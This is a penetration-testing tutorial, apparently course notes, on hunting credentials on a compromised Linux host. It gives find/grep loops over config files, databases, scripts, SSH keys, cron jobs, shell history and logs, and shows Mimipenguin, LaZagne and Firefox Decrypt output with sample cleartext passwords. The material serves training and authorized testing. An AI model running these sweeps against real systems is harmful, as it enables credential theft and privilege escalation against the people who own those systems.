# Credential Hunting in Linux

Credential hunting on Linux follows the core principle that everything in Linux is a file, meaning credentials can surface in configuration files, scripts, databases, shell history, log files, and browser storage — all readable from the filesystem given sufficient permissions. A methodical sweep across these categories dramatically increases the chance of lateral or vertical privilege escalation following initial access.

## Categories of Credential Sources

Four broad categories cover the majority of credential locations on a Linux system:

- **Files** — configuration files, databases, notes, scripts, cronjobs, SSH keys
- **History** — shell history files, application logs
- **Memory** — cached cleartext credentials, in-process authentication data
- **Keyrings** — OS-level and browser-level password stores

The context of the system should guide the search order. A database server will have different high-value locations than a developer workstation or a web server. Always consider what the system does and what processes run on it before diving into generic sweeps.

## File-Based Hunting

### Configuration Files

Configuration files are the most consistently productive source of credentials on Linux systems. Most carry `.conf`, `.config`, or `.cnf` extensions, though they can be renamed arbitrarily. The following loop finds all configuration files and filters out noise from library and font directories:

```bash
for l in $(echo ".conf .config .cnf"); do
    echo -e "\nFile extension: $l"
    find / -name "*$l" 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

To narrow the results further, search inside each found file for credential-related keywords while skipping commented lines:

```bash
for i in $(find / -name "*.cnf" 2>/dev/null | grep -v "doc\|lib"); do
    echo -e "\nFile: $i"
    grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done
```

### Databases

Local database files (`.sql`, `.db`, `.db*`) frequently contain credential tables or embedded application passwords:

```bash
for l in $(echo ".sql .db .*db .db*"); do
    echo -e "\nDB File extension: $l"
    find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

Firefox stores its credential databases at `~/.mozilla/firefox/<profile>/key4.db` and `cert9.db` — these appear in `.db` searches and are specifically targeted by [Firefox Decrypt](https://github.com/unode/firefox_decrypt) and [LaZagne](https://github.com/AlessandroZ/LaZagne).

### Notes and Plaintext Files

Notes are often the most directly rewarding finds but the hardest to locate systematically because they may have no extension at all. The following command searches for `.txt` files and files with no extension across all home directories:

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

### Scripts

Automation scripts regularly contain hardcoded credentials because they need to authenticate without user interaction. All common scripting language extensions should be swept:

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
    echo -e "\nFile extension: $l"
    find / -name "*$l" 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

### SSH Keys

SSH private keys can be named arbitrarily, so extension-based searches miss them. They can be located reliably by searching for their unique header strings:

```bash
# Private keys
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

# Public keys
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```

Any private key found that is not passphrase-protected can be used directly for SSH authentication to whatever hosts are listed in the user's `~/.ssh/known_hosts` file.

### Cronjobs

Cronjobs frequently contain hardcoded credentials when scripts are run automatically. Both the system-wide crontab and the per-directory cron files should be checked:

```bash
# System crontab
cat /etc/crontab

# Per-interval directories and custom cron entries
ls -la /etc/cron.*/
ls -la /etc/cron.d/
```

Note entries like `/etc/cron.d/john` or any non-standard file — these are worth inspecting individually for scripts that authenticate to databases, APIs, or remote hosts.

## History-Based Hunting

### Shell History

The `.bash_history` file is one of the most consistently valuable sources because administrators often type credentials directly into command-line tools during troubleshooting. A single command reads the last five lines across all users' bash files simultaneously:

```bash
tail -n5 /home/*/.bash*
```

A real example of what this surfaces:

```
==> /home/cry0l1t3/.bash_history <==
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK
```

The credential was passed as a command-line argument to a script — a very common pattern with custom internal tools. Also check `.bash_profile`, `.bashrc`, and `.profile` for exported environment variables containing credentials (`export DB_PASS=...`).

### Log Files

Log files contain a historical record of authentication events, sudo commands, service connections, and SSH sessions. Rather than reading each log individually, the following loop scans all logs in `/var/log/` for security-relevant keywords in a single pass:

```bash
for i in $(ls /var/log/* 2>/dev/null); do
    GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=\|logs" $i 2>/dev/null)
    if [[ $GREP ]]; then
        echo -e "\n#### Log file: $i"
        grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND=\|logs" $i 2>/dev/null
    fi
done
```

Key log files by category:

| Log File | Content |
|---|---|
| `/var/log/auth.log` (Debian) | All authentication events, SSH logins, sudo usage |
| `/var/log/secure` (RedHat/CentOS) | Equivalent to auth.log on RHEL-based systems |
| `/var/log/syslog` | General system activity |
| `/var/log/faillog` | Failed login attempts |
| `/var/log/cron` | Cron execution records |
| `/var/log/mysqld.log` | MySQL authentication and query logs |
| `/var/log/httpd` | Apache access and error logs |

## Memory-Based Hunting

### Mimipenguin

[Mimipenguin](https://github.com/huntergregal/mimipenguin) is the Linux equivalent of Mimikatz for cleartext credential extraction. It works by dumping the memory of authentication-related processes (GNOME Keyring, GDM, vsftpd, Apache HTTP Basic Auth sessions) and using regex patterns combined with `/etc/shadow` hash comparison to identify cleartext passwords within the dump. It was assigned [CVE-2018-20781](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781) and remains functional on unpatched GNOME Keyring versions. Root privileges are required:

```bash
sudo python3 mimipenguin.py

[SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
```

### LaZagne

[LaZagne](https://github.com/AlessandroZ/LaZagne) provides the broadest coverage of any single tool for Linux credential hunting. On Linux it targets:

```bash
sudo python2.7 laZagne.py all

------------------- Shadow passwords -----------------
[+] Hash found !!!
Login: sambauser
Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL...

[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY
```

Sources it covers include: Wi-Fi/wpa_supplicant, libsecret, KWallet, all Chromium-based browsers, Mozilla Firefox, Thunderbird, Git credentials, ENV variables, Grub configuration, fstab, AWS CLI credentials, FileZilla, SFTP clients, SSH agent keys, Apache htpasswd files, Docker registry credentials, KeePass databases, and OS keyrings.

## Browser Credential Extraction

### Firefox

Firefox encrypts stored passwords using a PBKDF2-derived key stored in `key4.db` and stores the credential ciphertext in `logins.json`. Both files live inside the Firefox profile directory:

```bash
# Find the profile
ls -l ~/.mozilla/firefox/ | grep default

# Read the encrypted credential file
cat ~/.mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```

[Firefox Decrypt](https://github.com/unode/firefox_decrypt) decrypts the logins.json contents without requiring any external keys — it derives the decryption key from the profile's key4.db directly:

```bash
python3.9 firefox_decrypt.py

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'
```

LaZagne's `browsers` module performs the same operation and is simpler to run in a single command:

```bash
python3 laZagne.py browsers
```

## Hunting Reference by Category

| Category | Location / Command | What to Find |
|---|---|---|
| Config files | `find / -name "*.conf" -o -name "*.cnf"` | DB passwords, service credentials |
| Database files | `find / -name "*.db" -o -name "*.sql"` | Credential tables, Firefox key4.db |
| Notes | `find /home/* -type f -name "*.txt" -o ! -name "*.*"` | Plaintext passwords, access lists |
| Scripts | `find / -name "*.sh" -o -name "*.py" -o -name "*.pl"` | Hardcoded credentials in automation |
| SSH keys | `grep -rnw "PRIVATE KEY" /home/*` | Unprotected private keys |
| Cronjobs | `/etc/crontab`, `/etc/cron.d/` | Credentials in scheduled scripts |
| Shell history | `tail -n5 /home/*/.bash*` | Credentials typed as CLI arguments |
| Logs | Loop over `/var/log/*` with grep | Auth events, sudo commands, SSH sessions |
| Memory | `mimipenguin.py` (root) | GNOME Keyring cleartext passwords |
| All sources | `laZagne.py all` (root) | Broadest automated sweep |
| Firefox | `firefox_decrypt.py` | Decrypted browser-saved passwords |
